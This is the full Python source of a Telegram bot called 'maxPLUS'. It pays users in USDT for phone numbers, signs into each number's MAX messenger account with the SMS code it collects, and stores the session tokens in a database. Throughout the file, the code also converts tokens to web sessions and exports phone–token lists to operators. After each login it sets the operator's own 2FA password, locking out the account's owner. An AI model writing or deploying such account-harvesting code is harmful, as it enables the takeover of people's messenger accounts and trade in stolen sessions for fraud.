import asyncio
import os
import asyncpg
import logging
from datetime import datetime
from zoneinfo import ZoneInfo
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pymax import Client, ExtraConfig, WebClient
from pymax.auth.providers import PasswordProvider
from aiocryptopay import AioCryptoPay, Networks

# === Логирование ===
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("bot.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# === Конфигурация из переменных окружения ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
DATABASE_URL = os.getenv("DATABASE_URL")
DEFAULT_2FA_PASSWORD = os.getenv("PASS", "")
CRYPTO_BOT_TOKEN = os.getenv("CRYPTO2", "")
APPROVED_GROUP_ID = int(os.getenv("GROUP_ID", 0))

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pending = {}
waiting_code = {}
expecting_phone = set()
expecting_balance_clear = set()
db_pool = None
crypto = AioCryptoPay(token=CRYPTO_BOT_TOKEN, network=Networks.MAIN_NET) if CRYPTO_BOT_TOKEN else None
blacklisted_numbers = set()

# === NoPasswordProvider ===
class NoPasswordProvider(PasswordProvider):
    async def get_password(self, hint: str | None = None) -> str:
        raise Exception("2FA not supported")

# === TelegramSmsProvider ===
class TelegramSmsProvider:
    def __init__(self):
        self._queue = asyncio.Queue()

    async def set_code(self, code: str):
        await self._queue.put(code)

    async def get_code(self, phone: str) -> str:
        return await self._queue.get()

# === Работа с PostgreSQL ===
async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS approved_groups (
                group_id BIGINT PRIMARY KEY
            )
        """)
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS tokens (
                phone TEXT PRIMARY KEY,
                token TEXT NOT NULL,
                alive BOOLEAN DEFAULT TRUE,
                created_at TIMESTAMP DEFAULT NOW()
            )
        """)
        try:
            await conn.execute("ALTER TABLE tokens ADD COLUMN exported BOOLEAN DEFAULT FALSE")
        except Exception:
            pass

        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                balance REAL DEFAULT 0.0
            )
        """)
    logger.info("База данных инициализирована")

async def is_group_approved(group_id: int) -> bool:
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT 1 FROM approved_groups WHERE group_id = $1", group_id)
        return row is not None

async def save_token_to_db(phone: str, token: str):
    async with db_pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO tokens (phone, token) VALUES ($1, $2) "
            "ON CONFLICT (phone) DO UPDATE SET token = $2, alive = TRUE, created_at = NOW()",
            phone, token
        )

async def get_all_tokens():
    async with db_pool.acquire() as conn:
        rows = await conn.fetch("SELECT phone, token, alive, exported FROM tokens")
        return [{"phone": r["phone"], "token": r["token"], "alive": r["alive"], "exported": r["exported"]} for r in rows]

async def get_token_by_phone(phone: str):
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT phone, token, alive FROM tokens WHERE phone = $1", phone)
        return {"phone": row["phone"], "token": row["token"], "alive": row["alive"]} if row else None

async def update_token_status(phone: str, alive: bool):
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE tokens SET alive = $1 WHERE phone = $2", alive, phone)

async def mark_tokens_exported(phone_list: list[str]):
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE tokens SET exported = TRUE WHERE phone = ANY($1)", phone_list)

async def reset_exported():
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE tokens SET exported = FALSE")

async def delete_dead_tokens():
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM tokens WHERE alive = FALSE")

# === Баланс пользователя ===
async def get_user_balance(user_id: int) -> float:
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", user_id)
        return row["balance"] if row else 0.0

async def add_to_balance(user_id: int, amount: float):
    async with db_pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO users (user_id, balance) VALUES ($1, $2) "
            "ON CONFLICT (user_id) DO UPDATE SET balance = users.balance + $2",
            user_id, amount
        )

# === Проверка токена на живость ===
async def check_token_alive(token: str) -> bool:
    try:
        client = Client(
            phone="+70000000000",
            work_dir="cache",
            session_name="check.db",
            extra_config=ExtraConfig(token=token),
        )
        await asyncio.wait_for(client.start(), timeout=10)
        return True
    except Exception:
        return False

# === Чтение токена из SQLite-сессии PyMax ===
def read_token_from_session(phone: str) -> str | None:
    import sqlite3
    try:
        conn = sqlite3.connect(f"cache/{phone}.db")
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM sessions WHERE key = 'token'")
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else None
    except Exception:
        return None

# === Проверка: одобренная группа ===
async def is_approved_group(msg: Message) -> bool:
    if msg.chat.type in ("group", "supergroup"):
        return await is_group_approved(msg.chat.id)
    return False

# === Главное меню ===
def main_menu_text():
    return (
        "👋 Приветствуем вас в боте maxPLUS\\.\n\n"
        "Данный сервис полностью автоматизирован: вводите номер, авторизуетесь, получаете доход\\.\n"
        "Бот работает 24/7, мгновенно обрабатывает SMS и авторизует номера без ручного вмешательства\\.\n\n"
        "Актуальная цена:\n"
        "💳 \\- \\$4\\.00"
    )

def main_menu_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Профиль", callback_data="profile"),
            InlineKeyboardButton(text="FAQ", callback_data="faq")
        ],
        [
            InlineKeyboardButton(text="Начать работу", callback_data="start_work")
        ]
    ])

# === Обработчики команд ===

@dp.message(Command("start"))
async def start_cmd(msg: Message):
    if msg.chat.type in ("group", "supergroup"):
        return
    logger.info(f"User {msg.from_user.id} — /start")
    await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")

@dp.message(Command("cancel"))
async def cancel_cmd(msg: Message):
    if msg.chat.type in ("group", "supergroup"):
        return
    expecting_phone.discard(msg.from_user.id)
    waiting_code.pop(msg.from_user.id, None)
    pending.pop(msg.from_user.id, None)
    logger.info(f"User {msg.from_user.id} — /cancel")
    await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")

@dp.message(Command("help"))
async def help_cmd(msg: Message):
    if not await is_approved_group(msg):
        return

    text = (
        "📋 <b>Команды maxPLUS</b>\n\n"
        "┌ <b>Основные:</b>\n"
        "├ /start — Главное меню\n"
        "├ /stats — Статистика и выгрузка токенов\n"
        "└ /help — Список команд\n\n"
        "┌ <b>Казна:</b>\n"
        "└ /pay 5.00 — Пополнить казну\n\n"
        "┌ <b>Админ:</b>\n"
        "├ /set ID — Одобрить группу\n"
        "└ /unset ID — Запретить группу\n\n"
        "<b>Авторизация:</b>\n"
        "1. Нажмите «Начать работу»\n"
        "2. Отправьте номер телефона\n"
        "3. Введите код <b>ответом</b> на сообщение бота"
    )
    await msg.answer(text, parse_mode="HTML")

@dp.message(Command("chatid"))
async def chat_id_cmd(msg: Message):
    await msg.answer(f"ID этого чата: `{msg.chat.id}`", parse_mode="MarkdownV2")

@dp.message(Command("set"))
async def set_group(msg: Message):
    if msg.chat.type not in ("group", "supergroup"):
        return
    if msg.from_user.id != ADMIN_ID:
        return

    try:
        group_id = int(msg.text.split()[1])
        async with db_pool.acquire() as conn:
            await conn.execute(
                "INSERT INTO approved_groups (group_id) VALUES ($1) ON CONFLICT DO NOTHING",
                group_id
            )
        logger.info(f"Admin {msg.from_user.id} — одобрил группу {group_id}")
        await msg.answer(f"✅ Группа {group_id} одобрена")
    except (IndexError, ValueError):
        await msg.answer("❌ Используй: /set ID_группы")

@dp.message(Command("unset"))
async def unset_group(msg: Message):
    if msg.chat.type not in ("group", "supergroup"):
        return
    if msg.from_user.id != ADMIN_ID:
        return

    try:
        group_id = int(msg.text.split()[1])
        async with db_pool.acquire() as conn:
            await conn.execute("DELETE FROM approved_groups WHERE group_id = $1", group_id)
        logger.info(f"Admin {msg.from_user.id} — удалил группу {group_id}")
        await msg.answer(f"✅ Группа {group_id} больше не одобрена")
    except (IndexError, ValueError):
        await msg.answer("❌ Используй: /unset ID_группы")

@dp.message(Command("stats"))
async def stats_cmd(msg: Message):
    if not await is_approved_group(msg):
        return

    tokens = await get_all_tokens()

    desktop_total = len(tokens)
    desktop_alive = sum(1 for t in tokens if t["alive"])
    desktop_unexported = sum(1 for t in tokens if not t["exported"])

    web_tokens = []
    for t in tokens:
        web_token = read_token_from_session(f"web_{t['phone']}")
        if web_token:
            web_tokens.append(t)

    web_total = len(web_tokens)
    web_alive = sum(1 for t in web_tokens if t["alive"])
    web_unexported = sum(1 for t in web_tokens if not t["exported"])

    async with db_pool.acquire() as conn:
        user_count = await conn.fetchval("SELECT COUNT(*) FROM users")

    treasury_text = "Нет данных"
    if crypto:
        try:
            balances = await crypto.get_balance()
            treasury_parts = []
            for b in balances:
                treasury_parts.append(f"└ {b.currency_code}: {b.available}")
            treasury_text = "\n".join(treasury_parts) if treasury_parts else "└ Пусто"
        except Exception:
            treasury_text = "└ Ошибка получения"

    text = (
        f"📊 <b>Статистика maxPLUS</b>\n\n"
        f"👥 Пользователей: {user_count or 0}\n\n"
        f"🔑 <b>DESKTOP:</b> {desktop_total} (живых: {desktop_alive}) | не выгружено: {desktop_unexported}\n"
        f"🔑 <b>WEB:</b> {web_total} (живых: {web_alive}) | не выгружено: {web_unexported}\n\n"
        f"💰 <b>Баланс казны:</b>\n{treasury_text}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=f"Выгрузить DESKTOP ({desktop_unexported})", callback_data="export_desktop"),
            InlineKeyboardButton(text=f"Выгрузить WEB ({web_unexported})", callback_data="export_web")
        ],
        [
            InlineKeyboardButton(text="Сбросить выгрузку", callback_data="reset_export"),
            InlineKeyboardButton(text="Очистить мёртвые", callback_data="clear_dead")
        ],
        [
            InlineKeyboardButton(text="Чистка балансов", callback_data="clear_balance")
        ]
    ])

    await msg.answer(text, reply_markup=keyboard, parse_mode="HTML")

# === Пополнение казны ===
@dp.message(Command("pay"))
async def pay_cmd(msg: Message):
    if not await is_approved_group(msg):
        return
    if not crypto:
        return await msg.answer("❌ Платёжная система не настроена")

    try:
        amount = float(msg.text.split()[1])
    except (IndexError, ValueError):
        return await msg.answer("❌ Используй: /pay 5.00")

    if amount <= 0:
        return await msg.answer("❌ Сумма должна быть больше нуля")

    try:
        invoice = await crypto.create_invoice(
            asset='USDT',
            amount=amount,
            description=f"Пополнение казны maxPLUS от {msg.from_user.id}"
        )
        await msg.answer(
            f"📥 Ссылка на пополнение {amount:.2f} USDT:\n{invoice.bot_invoice_url}"
        )
    except Exception as e:
        await msg.answer(f"❌ Ошибка создания счёта: {e}")

# === Обработчики callback'ов ===

@dp.callback_query(lambda c: c.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    balance = await get_user_balance(user_id)
    dollars = int(balance)
    cents = int((balance - dollars) * 100)
    text = (
        f"🪪 Ваш ID: {user_id}\n"
        f"💰 Баланс: \\${dollars}\\.{cents:02d}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Вывести", callback_data="withdraw"),
            InlineKeyboardButton(text="Назад", callback_data="back_to_start")
        ]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="MarkdownV2")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_start")
async def back_to_start_callback(callback: CallbackQuery):
    expecting_phone.discard(callback.from_user.id)
    await callback.message.edit_text(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    balance = await get_user_balance(user_id)

    if balance < 1.0:
        await callback.answer("Недостаточно средств. Минимальная сумма вывода — $1.00", show_alert=True)
        return

    if not crypto:
        await callback.answer("Платёжная система не настроена", show_alert=True)
        return

    try:
        check = await crypto.create_check(asset='USDT', amount=balance)
        await add_to_balance(user_id, -balance)
        await callback.message.answer(
            f"💳 Чек на вывод {balance:.2f} USDT:\n{check.bot_check_url}"
        )
    except Exception:
        await callback.message.answer(
            "📲 Казна бота еще не пополнена на сумму вашего вывода, подождите или свяжитесь с менеджером."
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "export_web")
async def export_web_callback(callback: CallbackQuery):
    tokens = await get_all_tokens()
    unexported = [t for t in tokens if not t["exported"]]

    if not unexported:
        await callback.answer("Нет невыгруженных токенов", show_alert=True)
        return

    await callback.message.answer(f"⏳ Конвертирую и выгружаю WEB-токены ({len(unexported)} шт.)...")

    converted = 0
    web_tokens_list = []
    exported_phones = []

    for t in unexported:
        phone = t["phone"]
        token = t["token"]
        try:
            web_client = WebClient(
                work_dir="cache",
                session_name=f"web_{phone}.db",
                extra_config=ExtraConfig(token=token),
            )
            await web_client.start()
            web_token = read_token_from_session(f"web_{phone}")
            if web_token:
                await save_token_to_db(phone, web_token)
                web_tokens_list.append(f"{phone} — {web_token}")
                exported_phones.append(phone)
                converted += 1
                logger.info(f"Converted {phone} -> WEB")
        except Exception as e:
            logger.warning(f"Failed to convert {phone}: {e}")

    if exported_phones:
        await mark_tokens_exported(exported_phones)

    if not web_tokens_list:
        await callback.message.answer("❌ Не удалось конвертировать ни один токен")
        await callback.answer()
        return

    from io import BytesIO
    file = BytesIO("\n".join(web_tokens_list).encode())
    file.name = "web_tokens.txt"
    await callback.message.answer_document(file, caption=f"WEB-токены ({converted} шт.)")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "export_desktop")
async def export_desktop_callback(callback: CallbackQuery):
    tokens = await get_all_tokens()
    unexported = [t for t in tokens if not t["exported"]]

    if not unexported:
        await callback.answer("Нет невыгруженных токенов", show_alert=True)
        return

    desktop_list = [f"{t['phone']} — {t['token']}" for t in unexported]
    await mark_tokens_exported([t["phone"] for t in unexported])

    from io import BytesIO
    file = BytesIO("\n".join(desktop_list).encode())
    file.name = "desktop_tokens.txt"
    await callback.message.answer_document(file, caption=f"DESKTOP-токены ({len(desktop_list)} шт.)")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "reset_export")
async def reset_export_callback(callback: CallbackQuery):
    await reset_exported()
    await callback.message.answer("✅ Счётчик выгрузки сброшен. Все токены доступны для выгрузки.")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "clear_dead")
async def clear_dead_callback(callback: CallbackQuery):
    await delete_dead_tokens()
    await callback.message.answer("✅ Мёртвые токены удалены из базы.")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "clear_balance")
async def clear_balance_callback(callback: CallbackQuery):
    expecting_balance_clear.add(callback.message.chat.id)
    await callback.message.answer("Введите ID пользователя, баланс которого нужно очистить:")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "faq")
async def faq_callback(callback: CallbackQuery):
    text = (
        "🔖 <b>Инструкция по использованию maxPLUS</b>\n\n"
        "1. Нажмите <b>«Начать работу»</b> в главном меню\n"
        "2. Отправьте номер телефона в международном формате\n"
        "   Например: +79161234567 или 89161234567\n"
        "3. Дождитесь SMS с кодом подтверждения 📩\n"
        "4. Введите код <b>строго ответом</b> на сообщение бота\n"
        "5. После успешной авторизации баланс пополнится на $4.00 💰\n\n"
        "🔐 Код состоит ровно из 6 цифр, без букв и символов\n"
        "🛡️ Если на номере включена двухфакторная аутентификация — авторизация невозможна\n"
        "📩 При проблемах с SMS — подождите минуту и попробуйте снова"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="back_to_start")]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "start_work")
async def start_work_callback(callback: CallbackQuery):
    expecting_phone.add(callback.from_user.id)
    text = (
        "📧 В следующем сообщении отправьте номер телефона в международном формате\n\n"
        "Для завершения работы введите /cancel"
    )
    await callback.message.edit_text(text)
    await callback.answer()

# === Таймаут кода ===
async def code_timeout(user_id: int, phone: str):
    await asyncio.sleep(150)
    if user_id in waiting_code and user_id in pending:
        pending[user_id] = [s for s in pending[user_id] if s["phone"] != phone]
        if not pending[user_id]:
            waiting_code.pop(user_id, None)
        try:
            await bot.send_message(user_id, "🔖 Время на ввод кода истекло. Пожалуйста, начните авторизацию заново")
        except Exception:
            pass

# === Единый обработчик сообщений ===

@dp.message()
async def main_handler(msg: Message):
    if msg.text and msg.text.startswith("/"):
        return

    if msg.chat.type in ("group", "supergroup") and msg.chat.id in expecting_balance_clear:
        if msg.text and msg.text.isdigit():
            user_id = int(msg.text.strip())
            expecting_balance_clear.discard(msg.chat.id)
            async with db_pool.acquire() as conn:
                await conn.execute("UPDATE users SET balance = 0 WHERE user_id = $1", user_id)
            await msg.answer(f"✅ Баланс пользователя {user_id} очищен")
            return

    if msg.chat.type in ("group", "supergroup"):
        return

    raw = msg.text.strip() if msg.text else ""
    digits = "".join(c for c in raw if c.isdigit())
    is_phone = len(digits) in (10, 11) and (digits.startswith("7") or digits.startswith("8"))

    if msg.from_user.id in waiting_code and msg.reply_to_message and msg.reply_to_message.from_user.id == bot.id and not is_phone:
        return await code_as_reply(msg)

    if msg.from_user.id in waiting_code and not is_phone:
        return await msg.answer(
            "❌ Неверный формат ввода. Пожалуйста, введите код ответом на сообщение бота с инструкцией"
        )

    if msg.from_user.id not in expecting_phone:
        return

    if is_phone:
        if len(digits) == 11 and digits.startswith("7"):
            phone = "+" + digits
        elif len(digits) == 11 and digits.startswith("8"):
            phone = "+7" + digits[1:]
        else:
            phone = "+7" + digits

        if phone in blacklisted_numbers:
            return await msg.answer("❌ Слишком много попыток авторизации для этого номера")

        existing = await get_token_by_phone(phone)
        if existing and existing["alive"]:
            return await msg.answer("📲 Этот номер уже был авторизован ранее, повторная авторизация не требуется")

        logger.info(f"User {msg.from_user.id} — запрос SMS на номер {phone}")

        sms_provider = TelegramSmsProvider()
        client = Client(
            phone=phone,
            work_dir="cache",
            session_name=f"{phone}.db",
            sms_code_provider=sms_provider,
            password_provider=NoPasswordProvider(),
            extra_config=ExtraConfig(log_level="INFO"),
        )

        asyncio.create_task(run_client(msg, client, phone, sms_provider))
        return

    if msg.text:
        await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")

async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
    try:
        await msg.answer(f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты.")
        await asyncio.sleep(1.5)

        waiting_code[msg.from_user.id] = True
        instruction_msg = await msg.answer("📩 Введите код из SMS ответом на это сообщение:")

        if msg.from_user.id not in pending:
            pending[msg.from_user.id] = []
        pending[msg.from_user.id].append({
            "provider": sms_provider,
            "phone": phone,
            "message_id": instruction_msg.message_id
        })

        asyncio.create_task(code_timeout(msg.from_user.id, phone))

        await client.start()

        token = read_token_from_session(phone)
        if token:
            await save_token_to_db(phone, token)

        existing = await get_token_by_phone(phone)
        if existing and existing["alive"]:
            await msg.answer("📲 Этот номер уже был авторизован ранее, повторное начисление не выполнено")
            return

        await add_to_balance(msg.from_user.id, 4.0)

        logger.info(f"User {msg.from_user.id} — номер {phone} успешно авторизован")
        await msg.answer(
            "📲 Номер успешно авторизован, на ваш баланс зачислено \\$4\\.00",
            parse_mode="MarkdownV2"
        )

        if APPROVED_GROUP_ID:
            try:
                profile = client.me
                display_name = "Неизвестно"
                if profile and profile.contact:
                    first = profile.contact.first_name or ""
                    last = profile.contact.last_name or ""
                    display_name = f"{first} {last}".strip() or "Неизвестно"
                msk_time = datetime.now(ZoneInfo("Europe/Moscow")).strftime("%d.%m.%Y, %H:%M")
                await bot.send_message(
                    APPROVED_GROUP_ID,
                    f"📲 Новая авторизация: {phone}\n"
                    f"👤 Профиль: {display_name}\n"
                    f"🕐 Дата (МСК): {msk_time}"
                )
            except Exception:
                pass

        if DEFAULT_2FA_PASSWORD:
            await asyncio.sleep(15)
            try:
                await client.set_2fa(password=DEFAULT_2FA_PASSWORD)
                logger.info(f"Пароль 2FA установлен для {phone}")
            except Exception:
                logger.info(f"Пароль 2FA уже стоит на {phone}")

    except Exception as e:
        waiting_code.pop(msg.from_user.id, None)
        pending.pop(msg.from_user.id, None)
        error_text = str(e).lower()
        error_name = type(e).__name__.lower()

        if "2fa" in error_text or "password" in error_text or "not supported" in error_text:
            await msg.answer("❌ На номере включена двухфакторная аутентификация. Авторизация невозможна. Повторная попытка через 7 дней")
        elif "blocked" in error_text or "recovery" in error_text:
            await msg.answer("❌ Номер заблокирован или удалён. Восстановлению не подлежит, используйте другой номер")
        elif "limit" in error_text or "violate" in error_text or "слишком много попыток" in error_text:
            blacklisted_numbers.add(phone)
            await msg.answer("❌ Слишком много попыток авторизации для этого номера")
        elif "auth" in error_name or "code" in error_text or "token" in error_text:
            await msg.answer("❌ Неверный код подтверждения. Проверьте правильность ввода и повторите попытку")
        elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
            await msg.answer("❌ Проблемы с сетью. Проверьте подключение к интернету и попробуйте позже")
        elif "already" in error_text or "session" in error_text:
            await msg.answer("❌ Этот номер уже был авторизован ранее, повторный вход не требуется")
        else:
            await msg.answer(f"❌ Ошибка: {e}")

        logger.warning(f"User {msg.from_user.id} — номер {phone} ошибка: {error_text}")

async def code_as_reply(msg: Message):
    if msg.from_user.id not in pending or not pending[msg.from_user.id]:
        waiting_code.pop(msg.from_user.id, None)
        return await msg.answer("❌ Сессия устарела. Отправьте номер заново")

    code = msg.text.strip()

    if not code.isdigit() or len(code) != 6:
        return await msg.answer(
            "❌ Неверный формат кода. Код должен состоять ровно из 6 цифр, без букв и символов"
        )

    replied_msg_id = msg.reply_to_message.message_id
    session_data = None

    for s in pending[msg.from_user.id]:
        if s["message_id"] == replied_msg_id:
            session_data = s
            break

    if not session_data:
        return await msg.answer("❌ Ответьте именно на то сообщение, где бот просит ввести код")

    provider = session_data["provider"]
    phone = session_data["phone"]
    pending[msg.from_user.id].remove(session_data)

    if not pending[msg.from_user.id]:
        waiting_code.pop(msg.from_user.id, None)

    logger.info(f"User {msg.from_user.id} — код принят для {phone}")
    await provider.set_code(code)
    await msg.answer("📩 Код принят, запущен процесс авторизации. Ожидайте завершения...")

async def main():
    await init_db()
    logger.info("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
